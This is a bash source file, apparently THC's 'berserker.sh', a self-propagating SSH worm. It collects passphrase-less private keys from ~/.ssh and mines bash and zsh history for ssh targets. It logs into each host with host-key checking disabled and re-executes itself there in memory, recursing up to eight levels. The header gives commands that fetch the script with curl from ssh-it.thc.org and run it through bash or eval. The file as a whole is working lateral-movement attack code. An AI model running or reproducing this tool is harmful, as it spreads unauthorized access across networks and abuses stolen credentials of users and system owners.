#! /usr/bin/env bash

# -----BEGIN berserker.sh-----
#
# This script might be executed 'in memory' with one of these two commands:
#      bash -c "$(cat src/funcs src/berserker.sh)"
#      bash -c "$(cat bs)"
#      export BS="$(curl -fsSL ssh-it.thc.org/bs)" && bash -c "$BS"
#      bash -c "IFS='' BS=\"\$(curl -fsSL ssh-it.thc.org/bs)\" && eval \$BS"
#
# BS_DEPTH=8       The depth before the berseker stops
# THC_DEBUG=1      Enable debug output
# BS_HISTFILE=     The bash history file to use
# BS_ZSH_HISTFILE= The zsh history file to use

# If this case we can not source funcs and must hope that BS contains ourself.
BINDIR="$(cd "$(dirname "${0}")" || exit; pwd)"
if [[ "$0" != "bash" ]]; then
	source "${BINDIR}/funcs" || exit 254
	# Slurp myself into BerSerker
	IFS="" BS="$(cat "${BINDIR}/funcs" "${0}")"
else
	# HERE: executed in memory. Must make sure that BS= contains myself.
	[[ -z $_BS ]] && [[ -z $BS ]] && ERREXIT 127 "Use '${CDM}(export BS=\"\$(curl -fsDL ssh-it.thc.org/bs)\" && bash -c \"\$BS\")${CN}'"
fi
# IFS="" BS="$(cat egg.sh)"
# Escape any ' to '"'"' so that $_BS can be passed to export _BS='$_BS'; bash -c "$_BS"
[[ -z $_BS ]] && _BS="$(echo "$BS" | sed 's/\x27/\x27"\x27"\x27/g')"



# try_tmpdir <return variable> <directory>
try_tmpdir()
{
	local dir

	[[ -z $2 ]] && return
	eval "[[ -n \$$1 ]]" && { return; } # already set
	[[ ! -d "${2}" ]] && return

	dir="${2}.bs-${UID}"
	[[ ! -d "${dir}" ]] && { (umask 077 && mkdir -p "${dir}") || { DEBUGF "Cant create ${dir}"; return; } }
	touch "${dir}/id_ssh" || { DEBUGF "Not writeable: ${dir}"; return; }

	eval "$1=${dir}"
	DEBUGF "Using TMP directory '${dir}'"
}

cleanup()
{
	[[ -f "${BS_TMPDIR}/id_ssh" ]] && rm -f "${BS_TMPDIR}/id_ssh" &>/dev/null
	[[ -d "${BS_TMPDIR}" ]] && rmdir "${BS_TMPDIR}" &>/dev/null
}

ERREXIT_CLEANUP()
{
	cleanup
	ERREXIT $@
}

# Stubs to exract ssh command from history file
ZSH_HST_SSH="egrep '^:[[:space:]]+[0-9:]+;ssh[[:space:]]+'|cut -d\; -f2-"
BASH_HST_SSH="grep '^ssh '"

is_passwordless()
{
	local ret

	[[ ! -f "${1}" ]] && { false; return; }
	[[ -z $BS_TMPDIR ]] && { false; return; }
	(umask 177 && cp "${1}" "${BS_TMPDIR}/id_ssh") && ssh-keygen -p -f "${BS_TMPDIR}/id_ssh" -N "" -P "" &>/dev/null && ret=1 || ret=''
	rm -f "${BS_TMPDIR}/id_ssh" &>/dev/null
	[[ -z $ret ]] && { false; return; } || true
}

# Add key if not already added. Return FALSE if already known.
ssh_key_add()
{
	local b
	local file
	
	file="$1"
	b="$(ssh-keygen -B -f "${file}" | cut -f2 -d" ")"
	[[ -z $b ]] && { false; return; }
	[[ "${KEYS_BABBLE[*]}" = *"${b}"* ]] && { false; return; }
	DEBUGF "Found private key $(dirname "$file")/${CC}$(basename "$file")${CN}"
	KEYS_BABBLE+=("$b")

	KEYS+=("${file}")
	true
}

# Return those SSH options from a captured ssh command line argument
# that the berserker needs (and ignore all other options, such as -L/-R/-D etc)
ssh_from_history()
{
	local oa
	local hname
	shift 1 # first arg is 'ssh'
	
	IFS=" "
	# DEBUGF "1=$1 2=$2 3=$3 4=$4 5=$5"
	CMD=""
	OPTIND=0
	while getopts ":p:i:l:B:b:c:D:E:e:F:I:J:L:m:O:o:Q:R:S:W:w:" opt; do
		case ${opt} in
			p )
				DEBUGF "Port=${OPTARG}"
				CMD+="-p ${OPTARG} "
				;;
			l )
				# DEBUGF "Login=${OPTARG}"
				CMD+="-l ${OPTARG} "
				;;
			i )
				# History may contain shell variables and we need to expand those, e.g.
				# -i $HOME/.ssh/id_blah => /home/user/.ssh/id_blah
				oa="$(eval "echo $OPTARG")"
				is_passwordless "${oa}" && ssh_key_add "${oa}"
				;;
		esac

		# case ${opt} in
		# 	D )
		# 		;;
		# 	E )
		# 		;;
		# 	L )
		# 		;;
		# 	X )
		# 		;;
		# esac
	done

	shift $((OPTIND - 1))
	[[ -z $1 ]] && return

	# ssh @foobar.com
	[[ "$1" = @* ]] && { DEBUGF "Bad User in '$1'"; return; }
	# $1 is the user@HOSTNAME.
	# Extract hostname after @ or keep string if it does not contain '@'
	#   server
	#   user@server
	#   Result: hname="server"
	hname=${1#*@}

	# Check if hname is valid.
	[[ -z $hname ]] && { DEBUGF "Contains no hostname: '$1'"; return; }
	if [[ "$hname" =~ [a-zA-Z] ]]; then
		# HERE: It's a domain name.
		# Ignore if invalid characters
		[[ "$hname" =~ [:/] ]] && { DEBUGF "Hostname contains illegal characters: '$1'"; return; }
	elif [[ "$hname" =~ [0-9] ]]; then
		# IP or IPv6 address
		[[ "$hname" =~ [^0-9.:] ]] && { DEBUGF "Hostname contains illegal characters for an IP: '$1'"; return; }
	fi
	CMD+="$1"
	[[ "${CMD_LIST[*]}" = *"$CMD"* ]] && { DEBUGF "SKIP $CMD"; return; }
	CMD_LIST+=("$CMD")
}

set_myidonce()
{
	command -v hostnamectl >/dev/null && _BS_LOCALID_ROOT="$(hostnamectl | md5sum)" || \
		_BS_LOCALID_ROOT="$(((ifconfig || ip link show) 2>/dev/null | egrep '(ether|HWaddr)'; hostname)  | md5sum)"

	if [[ "$UID" -eq 0 ]]; then
		_BS_LOCALID_USER="$_BS_LOCALID_ROOT"
	else
		_BS_LOCALID_USER="$(echo "${_BS_LOCALID_ROOT}-${UID}" | md5sum)"
	fi
	_BS_LOCALID_USER="${_BS_LOCALID_USER:0:6}"
	_BS_LOCALID_ROOT="${_BS_LOCALID_ROOT:0:6}"
	_BS_ID="$_BS_LOCALID_USER"
}


### -----BEGIN INIT VARS #1-----
[[ -z $BS_DEPTH ]] && BS_DEPTH=8 # Max 8 level of deptn-ness before stopping berserker
[[ -z $BS_THIS_DEPTH ]] && { _BS_IS_MASTER=1; BS_THIS_DEPTH=0; }
[[ -n $BS_DEBUG_IS_SLAVE ]] && unset _BS_IS_MASTER
# Make sure $UID is valid
[[ -z $UID ]] && { UID="$(idd -u 2>/dev/null)" || ERREXIT 152 "\$UID not set"; }
[[ -z $COLUMNS ]] && { command -v tput >/dev/null && COLUMNS="$(tput cols)" || COLUMNS=80; }
set -o pipefail
### -----END INIT VARS #1-----

DX="│   │   │   │   │   │   │   │   │   │   "
#Building blocks cut&paste
#[#1] /home/user/.ssh/old-keys/id_dsa
#[#2] /home/user/.ssh/id_rsa-rpi
#├── Trying -p 22106 s
#│   └── [COMPLETE]
#├── Trying -p 22108 s
#│   ├── Trying -p 22108 s
#│   │   └── [COMPLETE]
#│   └── [COMPLETE]
#└── [COMPLETE]
	M_MSG_NFO()
	{
		[[ -n $lf_missing ]] && { echo ""; unset lf_missing; }

		local dx
		dx="${DX:0:$((${1}*4))}"
		echo -e "${dx}│${CF}${2}${CN}${CL}"
	}

	M_MSG_ERROR()
	{
		local dx
		dx="${DX:0:$((${1}*4))}"

		if [[ -n $lf_missing ]] || [[ -n $lf_missing_try ]]; then
			unset lf_missing
			local l
			l="$((COLUMNS-4-2-${#dx}-${#2} + n_esc))"

			printf "\r${dx}├── %-${l}.${l}b ${CDR}${2}${CN}\n" "ssh ${_bs_msg_try_last}"
			return
		fi

		echo -e "${dx}│ERROR: ${CDR}${2}${CN}${CL}"
	}


	M_MSG_TRY()
	{
		[[ -n $lf_missing ]] && { echo ""; unset lf_missing; }

		local dx
		dx="${DX:0:$((${1}*4))}"

		local l
		l="$((COLUMNS-4-19-${#dx}))"

		# Highlight root logins. Fiddle to use %*.*s correctly with ANSI color codes
		n_esc=0 # Extra ANSI codes not displayed but counted by printf(3)
		_bs_msg_try_last="${2}"
		len="${#_bs_msg_try_last}"
		_bs_msg_try_last="${2/root@/${CG}root${CN}@}"
		[[ "${len}" -ne "${#_bs_msg_try_last}" ]] && n_esc=11

		len="${#_bs_msg_try_last}"
		_bs_msg_try_last="${_bs_msg_try_last/-l root /-l ${CG}root${CN} }"
		[[ "${len}" -ne "${#_bs_msg_try_last}" ]] && n_esc=$((n_esc + 11))

		l="$((l + n_esc))"
		printf "${dx}├── %-${l}.${l}b %17s"  "ssh ${_bs_msg_try_last}" "${3}"

		lf_missing_try=1
	}

    # Output [OK] at end of the line
	M_MSG_TRY_OK()
	{
		local dx
		dx="${DX:0:$((${1}*4))}"

		local l
		l="$((COLUMNS-4-4-${#dx} + n_esc))"

		[[ -n $lf_missing ]] && echo ""
		lf_missing=1
		printf "\r${dx}├── %-${l}.${l}b ${CDG}OK${CN}" "ssh $_bs_msg_try_last"
	}

	M_MSG_DEPTH_REACHED()
	{
		:
	}

	M_MSG_TRY_COMPLETE()
	{
		local kstr
		kstr=" $2"

		local dx
		dx="${DX:0:$((${1}*4))}"

		if [[ -n $lf_missing ]]; then
			unset lf_missing
			local l
			l="$((COLUMNS-4-4-${#dx} + n_esc))"

			printf "\r${dx}├── %-${l}.${l}b ${CDG}OK${CN}\n" "ssh -i${kstr} ${_bs_msg_try_last}"
			return
		fi

		printf "${dx}│   └── [${CDY}COMPLETE${CDM}${kstr}${CN}]${CL}\n" 
	}

	M_MSG_FAILED()
	{
		echo -en "\r"
	}


	MSG_NFO()
	{
		echo "|I|${BS_THIS_DEPTH}|${_BS_ID}|$*"
	}

	# MSG_TRY <ssh param> <stats>
	MSG_TRY()
	{
		echo "|T|${BS_THIS_DEPTH}|${_BS_ID}|$1|$2"
	}

	MSG_TRY_OK()
	{
		echo "|O|${BS_THIS_DEPTH}|${_BS_ID}|$*"
	}

	MSG_TRY_COMPLETE()
	{
		echo "|C|${BS_THIS_DEPTH}|${_BS_ID}|$*"
	}

	MSG_DEPTH_REACHED()
	{
		echo "|D|${BS_THIS_DEPTH}|${_BS_ID}|"
	}

	MSG_TRY_OK_CALLER()
	{
		echo "|O|$((BS_THIS_DEPTH-1))|${_BS_ID_CALLER}|$*"
	}

	MSG_TRY_FAIL()
	{
		echo "|F|${BS_THIS_DEPTH}|${_BS_ID}|$*"
	}

	MSG_LINK()
	{
		echo "|L|${BS_THIS_DEPTH}|${_BS_ID}|${_BS_ID_CALLER}|$USER|$(hostname)"
	}

	MSG_ERROR()
	{
		echo "|E|${BS_THIS_DEPTH}|${_BS_ID}|$*"
	}


### -----BEGIN INIT VARS #2-----
set_myidonce
if [[ -z $_BS_IS_MASTER ]]; then
	MSG_TRY_OK_CALLER
	[[ -n $BS_THIS_DEPTH ]] && [[ "$BS_THIS_DEPTH" -ge "$BS_DEPTH" ]] && { MSG_DEPTH_REACHED; exit; } # TRUE, early exit 
fi
### -----END INIT VARS #2-----


loopdb_add()
{
	DEBUGF "Adding >${_BS_LOOPDB}<+=${1}"
	_BS_LOOPDB+="${1}|"
}

if [[ -n $_BS_IS_MASTER ]]; then
# IS MASTER
msg_dispatch()
{
	IFS='|' 
	while read -ra ar; do
		[[ -n ${ar[0]} ]] && echo "PROTOCOL ERROR: '${ar[*]}'" && continue

		[[ "${ar[1]}" = "I" ]] && { M_MSG_NFO "${ar[2]}" "${ar[4]}"; continue; }
		[[ "${ar[1]}" = "L" ]] && { loopdb_add "${ar[3]}"; continue; }
		[[ "${ar[1]}" = "O" ]] && { M_MSG_TRY_OK "${ar[2]}"; continue; } 
		[[ "${ar[1]}" = "T" ]] && { M_MSG_TRY "${ar[2]}" "${ar[4]}" "${ar[5]}"; continue; } 
		[[ "${ar[1]}" = "C" ]] && { M_MSG_TRY_COMPLETE "${ar[2]}" "${ar[4]}"; continue; } 
		[[ "${ar[1]}" = "D" ]] && { M_MSG_DEPTH_REACHED; continue; } 
		[[ "${ar[1]}" = "F" ]] && { M_MSG_FAILED; continue; } 
		[[ "${ar[1]}" = "E" ]] && { M_MSG_ERROR "${ar[2]}" "${ar[4]}"; continue; } 
		echo "X=${ar[*]}"
	done
}
else
# IS SLAVE
msg_dispatch()
{
	while read -r l; do
		if [[ "${l:1:1}" == "L" ]]; then
			IFS='|' ar=($l)
			# Record target host into our loop-db and forward to
			loopdb_add "${ar[3]}"
		fi
		echo "$l"
	done
}
fi


# This is a slave. Let the master know
# 1. who our parent/caller is
[[ -z $_BS_IS_MASTER ]] && { MSG_LINK; }

command -v md5sum >/dev/null || { command -v md5 >/dev/null && alias md5sum=md5; } || { MSG_ERROR "md5sum not found"; ERREXIT 0; }
command -v ssh-keygen &>/dev/null || ERREXIT 150 "ssh-keygen not found."
[[ ! -d "${HOME}/.ssh" ]] && ERREXIT 151 "~/.ssh does not exists. No keys found."

# Check if user 'ROOT' already visited this system
[[ "$_BS_LOOPDB" = *"$_BS_LOCALID_ROOT"* ]] && { MSG_NFO "Looping (root has been here)"; exit 0; } #ERREXIT 145 "Looping (root got this)"
# Check if _this_ normal user already visited this system
[[ "$_BS_LOOPDB" = *"$_BS_LOCALID_USER"* ]] && { MSG_NFO "Looping"; exit 0; } #ERREXIT 146 "Looping"
# Add myself to the loopDB
loopdb_add "${_BS_ID}"


# Find a writeable temp directory
# TMPDIR might be dynamic and changing for every shell invokation.
# This does not work for us as we wont find 'seen_id' to detect loops
# try_tmpdir "BS_TMPDIR" "${TMPDIR}" # DISABLED
try_tmpdir "BS_TMPDIR" "${HOME}/"
try_tmpdir "BS_TMPDIR" "/tmp/"
try_tmpdir "BS_TMPDIR" "/dev/shm/"
[[ ! -d "$BS_TMPDIR" ]] && ERREXIT 153 "Cant find writeable temp directory..."

# Find any password-less SSH PRIVATE KEY
[[ -f "${BS_TMPDIR}/id_ssh" ]] && rm "${BS_TMPDIR}/id_ssh" 

KEYS_BABBLE=()
KEYS=()
IFS=$'\n' fv=($(find "${HOME}/.ssh" -type f))
IFS=" "

for f in "${fv[@]}"; do
	[[ "$(head -n1 "$f")" = *"PRIVATE KEY"* ]] || { continue; }
	is_passwordless "${f}" || continue
	ssh_key_add "${f}" || continue
done

### Find potential hosts
############################
if [[ -n $BS_HISTFILE ]]; then
	hfile="${BS_HISTFILE}" && [[ -f "${hfile}" ]] && SSH_CMDS+="$(cat "${hfile}" | eval $BASH_HST_SSH)"
elif [[ -n $BS_ZSH_HISTFILE ]]; then
	hfile="${BS_ZSH_HISTFILE}" && [[ -f "${hfile}" ]] && SSH_CMDS+="$(cat "${hfile}" | eval $ZSH_HST_SSH)"
else	
	hfile="${HOME}/.zsh_history" && [[ -f "${hfile}" ]] && SSH_CMDS+="$(cat "${hfile}" | eval $ZSH_HST_SSH)"
	hfile="${HOME}/.bash_history" && [[ -f "${hfile}" ]] && SSH_CMDS+="$(cat "${hfile}" | eval $BASH_HST_SSH)"
fi

IFS=$'\n' SV=($(echo "$SSH_CMDS" | sort -u))
IFS=" "

for l in "${SV[@]}"; do
	# l='ssh -p 22106 -i ~/.ssh/id\ rsa\ spaces skyper@127.1 id'
	# l='ssh -p 22106 -i "$HOME/.ssh/id rsa spaces" skyper@127.1 id'
	# l='ssh -p 22106 -i "$HOME/.ssh/id rsa spaces" skyper@127.1 id'
	cmdline2array ARGV "$l"
	# ARGV=("ssh" "-p" "2764" "user@127.1")
	ssh_from_history "${ARGV[@]}"
done

if [[ -n $_BS_IS_MASTER ]]; then
	M_MSG_NFO 0 "Found ${#CMD_LIST[@]} hosts to try."
	M_MSG_NFO 0 "Found ${#KEYS[@]} keys without password."
else
	if [[ "${#CMD_LIST[@]}" -gt 0 ]] && [[ "${#KEYS[@]}" -gt 0 ]]; then
		MSG_NFO "Found ${#CMD_LIST[@]} hosts to try."
		[[ "${#KEYS[@]}" -gt 1 ]] && c="s" || c=""
		MSG_NFO "Found ${#KEYS[@]} key${c} without password."
	fi
fi

[[ "${#KEYS[@]}" -eq 0 ]] && ERREXIT_CLEANUP 0 "Nothing to do."

IFS=" "
# Create parameter list with ALL password-less private keys
n=0
for k in "${KEYS[@]}"; do
	KEYS_ARGV+=("-i" "$k");
	[[ $k =~ ^"$HOME" ]] && k="~${k:${#HOME}}"
	n=$((n+=1))
	[[ -n $_BS_IS_MASTER ]] && M_MSG_NFO 0 "[#${n}] $k" || MSG_NFO "[#${n}] $k"
done
[[ "$BS_THIS_DEPTH" -ge "$BS_DEPTH" ]] && exit # TRUE 

IFS=" "
n_failed=0
n_success=0
n=0


for c in "${CMD_LIST[@]}"; do
	n=$((n+=1))
	MSG_TRY "$c" "${n}/${#CMD_LIST[@]}"
	n_total=$((n_total+=1))
	ret=0
	{ err="$( { command ssh "-o" "BatchMode=yes" "-o" "ConnectTimeout=2" "-o" "StrictHostKeyChecking=no" "${KEYS_ARGV[@]}" -v $c \
			"export BS='$_BS'; _BS_ID_CALLER=\"${_BS_ID}\" _BS_LOOPDB=\"${_BS_LOOPDB}\" \
			THC_DEBUG=\"$THC_DEBUG\" BS_HISTFILE=\"${BS_HISTFILE}\" BS_DEPTH=\"$BS_DEPTH\" \
			BS_THIS_DEPTH=\"$((BS_THIS_DEPTH+1))\" bash -c \"\$BS\""; } 2>&1 1>&3 3>&- )"; } 3>&1 || ret=$?
	nkey="$(echo "$err" | grep -c 'tions that can continue')"
	# nkey="$(echo "$err" | egrep -c '(Trying private key|ffering public key)')"
	if [[ $ret -ne 0 ]]; then
		err="$(echo "$err" | grep -v ^debug | tr -d "\r" )"
		{ [[ $err = *"ermission"* ]] && MSG_ERROR "Permission denied"; } || \
		{ [[ "$nkey" -eq "${#KEYS[@]}" ]] && MSG_ERROR "Permission denied"; } || \
 		{ [[ $err = *"refused"* ]] && MSG_ERROR "Connection refused"; } || \
		{ [[ $err = *"timed out"* ]] && MSG_ERROR "Connection timed out"; } || \
		{ [[ $err = *"not resolve hostname"* ]] && MSG_ERROR "Could not resolve hostname"; } || \
		{ [[ $err = *"Too many authentication"* ]] && { MSG_ERROR "To many attempts ($((nkey-1)) allowed)"; }; } || \
		{ [[ $err = *"Host is down"* ]] && MSG_ERROR "Host is down"; } || \
		{ [[ $err = *"No route to host"* ]] && MSG_ERROR "No route to host"; } || \
		{ [[ $err = *"Disconnected"* ]] && MSG_ERROR "Disconnect"; } || \
		{ l="${#err}"
			# Make the error look awesome: Start at a full word but not more than 40 chars
			[[ "$l" -gt 40 ]] && { err="ERROR '$(echo "${err:$((l-40))}" | cut -f2- -d" ")'"; }
			MSG_ERROR "$err"; }

		n_failed=$((n_failed+=1))
		MSG_TRY_FAIL
		last_was_failed=1
	else
		nkidx=$((nkey-1))
		k="???"
		[[ "$nkidx" -ge 0 ]] && [[ "$nkidx" -lt "${#KEYS[@]}" ]] && k="${KEYS[$nkidx]}"
		n_success=$((n_success+=1))
		[[ $k =~ ^"$HOME" ]] && k="~${k:${#HOME}}" || k="$(basename "$k")"
		MSG_TRY_COMPLETE "$k"
		unset last_was_failed
	fi
done | msg_dispatch

# [[ -n $last_was_failed ]] && printf "%*s\r" "${COLUMNS}" ""
if [[ -n $_BS_IS_MASTER ]]; then
	echo -e "└──[${CDG}DONE${CN}]${CL}"
fi

ERREXIT_CLEANUP 0
